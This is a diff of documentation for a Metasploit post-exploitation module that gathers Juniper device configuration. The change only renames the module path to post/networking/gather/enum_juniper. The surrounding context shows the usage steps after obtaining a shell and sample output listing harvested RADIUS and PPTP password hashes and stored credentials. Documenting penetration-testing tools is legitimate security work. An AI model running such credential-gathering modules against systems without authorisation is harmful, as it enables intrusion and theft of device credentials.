@@ -27,7 +27,7 @@
 
   1. Start msfconsole
   2. Get a shell
-  3. Do: ```use post/juniper/gather/enum_juniper```
+  3. Do: ```use post/networking/gather/enum_juniper```
   4. Do: ```set session [id]```
   5. Do: ```set verbose true```
   6. Do: ```run```
@@ -59,7 +59,7 @@
 [+] radius server 1.1.1.1 password hash: $9$Y-4GikqfF39JGCu1Ileq.PQ6AB1hrlMBIyKvWdV
 [+] PPTP username 'pap_username' hash $9$he4revM87-dsevm5TQCAp0BErvLxd4JDNdkPfT/9BIR via PAP
 [*] Post module execution completed
-msf5 post(juniper/gather/enum_juniper) > creds
+msf5 post(networking/gather/enum_juniper) > creds
 Credentials
 ===========
 
@@ -87,7 +87,7 @@ host         origin       service            public          private            
 [*] Command shell session 2 opened (192.168.1.6:45623 -> 192.168.1.5:22) at 2018-02-19 21:32:20 -0500
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-resource (juniper_ex2200.rc)> use post/juniper/gather/enum_juniper
+resource (juniper_ex2200.rc)> use post/networking/gather/enum_juniper
 resource (juniper_ex2200.rc)> set session 2
 session => 2
 resource (juniper_ex2200.rc)> set verbose true
